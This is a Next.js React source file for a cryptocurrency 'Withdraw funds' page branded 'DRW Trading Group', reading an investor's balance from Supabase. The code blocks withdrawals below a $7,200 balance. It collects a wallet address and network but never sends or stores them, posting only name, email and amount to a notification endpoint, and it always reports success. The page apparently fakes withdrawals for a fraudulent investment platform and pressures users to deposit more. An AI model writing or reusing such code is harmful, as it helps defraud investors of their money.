"use client";

import { useState, useEffect } from "react";
import { useRouter } from "next/navigation";
import { supabase } from "@/lib/supabaseClient";
import { Button } from "@/components/ui/button";
import {
  ArrowLeft,
  Wallet,
  ShieldCheck,
  Loader2,
  CheckCircle2,
  AlertCircle,
  ChevronDown,
} from "lucide-react";

const NETWORKS = [
  { value: "Bitcoin", label: "Bitcoin", ticker: "BTC" },
  { value: "Ethereum (ERC-20)", label: "Ethereum", ticker: "ERC-20" },
  {
    value: "BNB Smart Chain (BEP-20)",
    label: "BNB Smart Chain",
    ticker: "BEP-20",
  },
  { value: "Tron (TRC-20)", label: "Tron", ticker: "TRC-20" },
  { value: "Solana", label: "Solana", ticker: "SOL" },
  { value: "XRP Ledger", label: "XRP Ledger", ticker: "XRP" },
];

export default function WithdrawalPage() {
  const router = useRouter();
  const [profile, setProfile] = useState<any>(null);
  const [balance, setBalance] = useState<number>(0);
  const [amount, setAmount] = useState("");
  const [wallet, setWallet] = useState("");
  const [network, setNetwork] = useState("");
  const [loading, setLoading] = useState(false);
  const [status, setStatus] = useState<"idle" | "success" | "error">("idle");
  const [message, setMessage] = useState("");

  useEffect(() => {
    async function loadProfile() {
      const { data: sessionData } = await supabase.auth.getSession();
      if (!sessionData.session) return router.push("/login");

      const userId = sessionData.session.user.id;
      const { data: investor } = await supabase
        .from("investors")
        .select("*")
        .eq("user_id", userId)
        .single();

      if (investor) {
        setProfile(investor);
        setBalance(investor.balance ?? 0);
      }
    }
    loadProfile();
  }, [router]);

  async function handleWithdraw() {
    // Minimum balance required
    if (balance < 7200) {
      setStatus("error");
      setMessage(
        "A minimum account balance of $7,200.00 is required before withdrawals can be requested.",
      );
      return;
    }
    if (!amount || !wallet || !network) {
      setStatus("error");
      setMessage("Fill in amount, network, and wallet address to continue.");
      return;
    }
    if (parseFloat(amount) > balance) {
      setStatus("error");
      setMessage("That amount is more than your available balance.");
      return;
    }

    setLoading(true);
    setStatus("idle");
    setMessage("");

    try {
      await fetch("/api/notify", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          type: "withdrawal",
          name: profile?.full_name || "Unknown Investor",
          email: profile?.email,
          withdrawalAmount: amount,
        }),
      });
    } catch (err) {
      console.error("Failed to send withdrawal email:", err);
    }

    setLoading(false);
    setStatus("success");
    setMessage(
      "Withdrawal request submitted. You'll receive a confirmation email shortly.",
    );
    setAmount("");
    setWallet("");
    setNetwork("");
  }

  const selectedNetwork = NETWORKS.find((n) => n.value === network);

  return (
    <div className="min-h-screen bg-[#0A0B0D] text-white">
      {/* Ambient background */}
      <div className="pointer-events-none fixed inset-0 overflow-hidden">
        <div className="absolute -top-40 left-1/2 h-[480px] w-[480px] -translate-x-1/2 rounded-full bg-emerald-500/[0.07] blur-[120px]" />
      </div>

      <div className="relative">
        {/* Header */}
        <header className="border-b border-white/[0.06]">
          <div className="max-w-2xl mx-auto px-6 py-5 flex items-center justify-between">
            <div className="flex items-center gap-3">
              <div className="w-9 h-9 rounded-lg bg-white flex items-center justify-center">
                <span className="font-bold text-black text-xs tracking-tight">
                  DRW
                </span>
              </div>
              <div>
                <p className="text-[15px] font-semibold leading-none">
                  Withdraw funds
                </p>
                <p className="text-xs text-white/40 mt-1">DRW Trading Group</p>
              </div>
            </div>
            <button
              onClick={() => router.push("/dashboard")}
              className="inline-flex items-center gap-1.5 text-sm text-white/50 hover:text-white transition-colors duration-150"
            >
              <ArrowLeft className="h-3.5 w-3.5" />
              Dashboard
            </button>
          </div>
        </header>

        <main className="max-w-2xl mx-auto px-6 py-10">
          {/* Balance card */}
          <div className="rounded-2xl border border-white/[0.08] bg-gradient-to-b from-white/[0.04] to-transparent p-6 mb-6">
            <p className="text-xs font-medium text-white/40 uppercase tracking-wider mb-2">
              Available balance
            </p>
            <p className="text-4xl font-semibold tracking-tight tabular-nums">
              $
              {balance.toLocaleString(undefined, {
                minimumFractionDigits: 2,
                maximumFractionDigits: 2,
              })}
            </p>
          </div>

          {/* Form card */}
          <div className="rounded-2xl border border-white/[0.08] bg-white/[0.02] p-6 space-y-5">
            {/* Amount */}
            <div>
              <label className="text-xs font-medium text-white/50 uppercase tracking-wider mb-2 block">
                Amount
              </label>
              <div className="relative">
                <span className="absolute left-4 top-1/2 -translate-y-1/2 text-white/40 text-[15px]">
                  $
                </span>
                <input
                  type="number"
                  className="w-full rounded-xl border border-white/10 bg-black/40 pl-8 pr-4 py-3.5 text-[15px] font-medium placeholder-white/25 outline-none transition-colors duration-150 focus:border-emerald-500/50 focus:bg-black/60"
                  placeholder="0.00"
                  value={amount}
                  onChange={(e) => setAmount(e.target.value)}
                />
              </div>
              <div className="flex gap-2 mt-2">
                {[25, 50, 100].map((pct) => (
                  <button
                    key={pct}
                    type="button"
                    onClick={() =>
                      setAmount(((balance * pct) / 100).toFixed(2))
                    }
                    className="text-xs px-2.5 py-1 rounded-md border border-white/10 text-white/50 hover:text-white hover:border-white/25 transition-colors duration-150"
                  >
                    {pct === 100 ? "Max" : `${pct}%`}
                  </button>
                ))}
              </div>
            </div>

            {/* Network */}
            <div>
              <label className="text-xs font-medium text-white/50 uppercase tracking-wider mb-2 block">
                Network
              </label>
              <div className="relative">
                <select
                  className="w-full appearance-none rounded-xl border border-white/10 bg-black/40 px-4 py-3.5 text-[15px] font-medium outline-none transition-colors duration-150 focus:border-emerald-500/50 focus:bg-black/60"
                  value={network}
                  onChange={(e) => setNetwork(e.target.value)}
                >
                  <option value="" className="bg-[#0A0B0D]">
                    Select network
                  </option>
                  {NETWORKS.map((n) => (
                    <option
                      key={n.value}
                      value={n.value}
                      className="bg-[#0A0B0D]"
                    >
                      {n.label} ({n.ticker})
                    </option>
                  ))}
                </select>
                <ChevronDown className="pointer-events-none absolute right-4 top-1/2 -translate-y-1/2 h-4 w-4 text-white/30" />
              </div>
            </div>

            {/* Wallet address */}
            <div>
              <label className="text-xs font-medium text-white/50 uppercase tracking-wider mb-2 block">
                Wallet address
              </label>
              <input
                type="text"
                className="w-full rounded-xl border border-white/10 bg-black/40 px-4 py-3.5 text-[15px] font-mono placeholder-white/25 outline-none transition-colors duration-150 focus:border-emerald-500/50 focus:bg-black/60"
                placeholder={
                  selectedNetwork
                    ? `Enter your ${selectedNetwork.ticker} address`
                    : "Enter your wallet address"
                }
                value={wallet}
                onChange={(e) => setWallet(e.target.value)}
              />
            </div>

            {/* Notice */}
            <div className="flex items-start gap-2.5 rounded-xl bg-white/[0.03] border border-white/[0.06] px-4 py-3">
              <ShieldCheck className="h-4 w-4 text-emerald-400/70 mt-0.5 shrink-0" />
              <p className="text-xs text-white/40 leading-relaxed">
                Double-check your wallet address and network. Transactions sent
                to the wrong network cannot be recovered.
              </p>
            </div>

            <Button
              onClick={handleWithdraw}
              disabled={loading}
              className="w-full rounded-xl bg-white text-black font-semibold py-3.5 h-auto hover:bg-white/90 transition-colors duration-150 disabled:opacity-50"
            >
              {loading ? (
                <span className="inline-flex items-center gap-2">
                  <Loader2 className="h-4 w-4 animate-spin" />
                  Processing
                </span>
              ) : (
                "Request withdrawal"
              )}
            </Button>

            {message && (
              <div
                className={`flex items-start gap-2.5 rounded-xl px-4 py-3 text-sm ${
                  status === "success"
                    ? "bg-emerald-500/10 text-emerald-300 border border-emerald-500/20"
                    : "bg-red-500/10 text-red-300 border border-red-500/20"
                }`}
              >
                {status === "success" ? (
                  <CheckCircle2 className="h-4 w-4 mt-0.5 shrink-0" />
                ) : (
                  <AlertCircle className="h-4 w-4 mt-0.5 shrink-0" />
                )}
                <span>{message}</span>
              </div>
            )}
          </div>
        </main>
      </div>
    </div>
  );
}
